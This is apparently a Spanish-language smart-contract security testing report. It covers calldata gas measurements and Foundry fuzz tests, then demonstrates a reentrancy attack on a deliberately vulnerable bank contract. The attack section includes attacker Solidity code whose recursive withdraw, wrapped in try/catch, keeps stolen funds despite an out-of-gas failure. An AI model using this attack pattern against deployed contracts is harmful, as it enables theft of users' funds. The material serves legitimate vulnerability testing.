# Informe Completo de Pruebas de Seguridad en Smart Contracts

Este documento detalla la implementación, ejecución y análisis de pruebas de seguridad realizadas sobre contratos inteligentes, enfocándose en consumo de gas de calldata, lógica general y vulnerabilidades de reentrancia.

## 1. Análisis de Consumo de Gas en Calldata

### Objetivo
Demostrar que en la EVM (Ethereum Virtual Machine), los bytes distintos de cero en la `calldata` (datos de entrada) consumen más gas que los bytes cero.

### Implementación (`tests/measure_calldata_gas.py`)
Se utilizó un script en Python con `web3.py` para enviar transacciones reales a un nodo local (`Anvil`) y medir el gas exacto del recibo de la transacción.

```python
def measure_gas(val, description):
    func_call = contract_instance.functions.f(val)
    # Enviamos transacción
    tx = func_call.build_transaction({ ... })
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    return receipt.gasUsed

# Caso 1: f(0) -> 32 bytes de ceros
gas_0 = measure_gas(0, "f(0)")

# Caso 2: f(MAX_UINT) -> 32 bytes de unos (0xFF...FF)
gas_max = measure_gas(2**256 - 1, "f(MAX_UINT)")
```

### Resultados (Terminal 1)
```text
f(0): Gas Used = 21576
f(MAX_UINT): Gas Used = 22440
Difference: 864 gas
Expected Difference (approx): 384 gas
```

### Interpretación
*   **Teoría:** En Ethereum, un byte cero cuesta **4 gas** y un byte no-cero cuesta **16 gas**. Una palabra de 32 bytes llena de unos debería costar `32 * (16 - 4) = 384` gas más que una de ceros.
*   **Práctica:** La diferencia observada es **864 gas**.
*   **Conclusión:** Se confirma que **los datos no-cero son más caros**. La discrepancia (864 vs 384) sugiere costos adicionales operativos en la EVM al procesar argumentos grandes o expansión de memoria, pero el principio de seguridad y optimización se mantiene: *usar ceros donde sea posible ahorra gas*.

---

## 2. Pruebas Funcionales Generales

### Objetivo
Verificar la lógica aritmética básica y asegurar que los casos de borde (overflow) estén controlados.

### Implementación (`test/CounterTest.t.sol`)
Usamos **Foundry** para tests unitarios. Destacamos el uso de `vm.assume` para filtrar entradas inválidas en tests de fuzzing.

```solidity
function testDoble(uint8 a, uint8 b) public {
    // Evitamos overflow limitando inputs, ya que Solidity 0.8+ hace revert por defecto
    vm.assume(uint256(a) * uint256(b) < 256);
    
    counter.doble(a, b);
    assertEq(counter.number(), expectedWrapped);
}
```

### Resultados (Terminal 1)
```text
Ran 3 tests for test/CounterTest.t.sol:CounterTest
[PASS] testDoble(uint8,uint8) (runs: 256, μ: 48125, ~: 20554)
[PASS] testIncrement(uint8) (runs: 256, μ: 61121, ~: 33875)
[PASS] testSetNumber(uint8) (runs: 256, μ: 22767, ~: 29530)
```

### Interpretación
*   **[PASS]:** Todos los tests pasaron exitosamente.
*   **Fuzzing:** Foundry ejecutó `testDoble` 256 veces con valores aleatorios de `a` y `b`.
*   **Seguridad:** El uso de `vm.assume` fue correcto para centrar el test en la lógica de negocio (`doble`) y no en el mecanismo de protección contra overflow de Solidity.

---

## 3. Vulnerabilidad de Reentrancia (Reentrancy)

Este fue el foco principal. Probamos el ataque de dos formas: manual (Foundry) y automática (Medusa).

### A. Prueba Manual con Foundry

#### Implementación (`test/ReentrancyTest.sol`)
Un test que orquesta el ataque paso a paso:
1.  Víctima deposita.
2.  Atacante deposita.
3.  Atacante ejecuta función maliciosa que retira recursivamente.

```solidity
function testReentrancyAttack() public {
    // ... setup de fondos ...
    attackContract.attack{value: 1 ether}();
    // Verificamos que el atacante tiene más de lo que puso
    assertGt(address(attackContract).balance, 1 ether);
}
```

#### Resultados (Terminal 1)
```text
Ran 1 test for test/ReentrancyTest.sol:ReentrancyTest
[PASS] testReentrancyAttack() (gas: 196773)
```

#### Interpretación
Confirma que **el contrato es vulnerable**. Un atacante humano (o un script específico) puede robar los fondos.

---

### B. Detección Automática con Medusa (Fuzzing)

Este es el resultado más interesante. Medusa es un fuzzer que intenta "romper" invariantes sin saber *cómo* hacerlo a priori.

#### Implementación (`src/ReentrancyMedusa.sol`)
Preparamos un entorno donde Medusa actúa como el atacante.
Clave del éxito: **`try/catch`**.

```solidity
receive() external payable {
    // Si recibimos fondos del banco (durante un retiro)...
    if (msg.sender == address(bank)) {
        total_received += msg.value; // Contamos el dinero robado
    }

    // Lógica de ataque: VOLVER A LLAMAR A WITHDRAW
    // Usamos try/catch para que si la recursión falla (por Out of Gas), 
    // NO revierta toda nuestra transacción y podamos quedarnos con lo robado hasta ese punto.
    if (address(bank).balance >= 1 ether && gasleft() > 5000) {
         try bank.withdraw() {} catch {} 
    }
}

function property_no_profit() public view returns (bool) {
    // Invariante: No debo tener más dinero del que deposité
    return total_received <= my_deposits;
}
```

#### Resultados (Terminal 1 y 2 - Trace)
1.  **Traza de Ejecución (Trace):**
    Vemos una repetición masiva de llamadas:
    ```text
    => [call] VulnerableBank.withdraw()
    => [call] ReentrancyMedusa.<receive>
    => [call] VulnerableBank.withdraw() (RE-ENTRADA)
    ...
    => [vm error ('out of gas')]
    ```
    Eventualmente, la recursión profunda agota el gas (`out of gas`).

2.  **Resultado de la Propiedad:**
    ```text
    [Property Test Execution Trace]
    => [call] ReentrancyMedusa.property_no_profit()
    => [return (false)]
    Test summary: 4 test(s) passed, 1 test(s) failed
    ```

#### Interpretación Detallada (¿Qué pasó?)
1.  **Inyección de Fondos:** En el constructor, inyectamos 100 Ether al Banco (simulando víctimas).
2.  **El Ataque:** Medusa llamó a `withdraw()`.
3.  **Recursión:** El banco envió Ether -> `ReentrancyMedusa.receive()` se activó -> llamó a `withdraw()` de nuevo -> el banco envió más Ether (antes de actualizar saldo) -> Repetir.
4.  **El "Out of Gas":** La recursión fue tan profunda que se acabó el gas. Normalmente, esto revertiría todo (y no se robaría nada).
5.  **El Truco `try/catch`:** Gracias a que envolvimos la llamada recursiva en `try bank.withdraw() {} catch {}`, cuando la llamada *más profunda* falló por falta de gas, el error **fue capturado**. La ejecución "desbobinó" la pila de llamadas exitosamente, guardando los cambios de estado (`total_received` incrementado).
6.  **Violación:** Al final, `total_received` (dinero sacado) fue mayor que `my_deposits` (dinero puesto). Medusa detectó que `property_no_profit` devolvió `false` e informó el fallo.

**Conclusión:** Medusa probó exitosamente que un patrón de interacción complejo podía violar la seguridad económica del contrato.
